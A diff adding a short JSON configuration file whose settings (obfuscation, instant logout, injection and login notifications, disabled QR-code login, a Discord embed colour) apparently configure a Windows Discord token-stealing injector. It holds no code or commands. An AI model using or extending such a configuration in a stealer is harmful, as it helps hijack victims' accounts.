@@ -1,0 +1,10 @@
+{
+    "platform": ["windows"],
+    "obfuscate": true,
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify":"true",
+    "disable-qr-code":"true",
+    "embed-color": "3447704"
+}
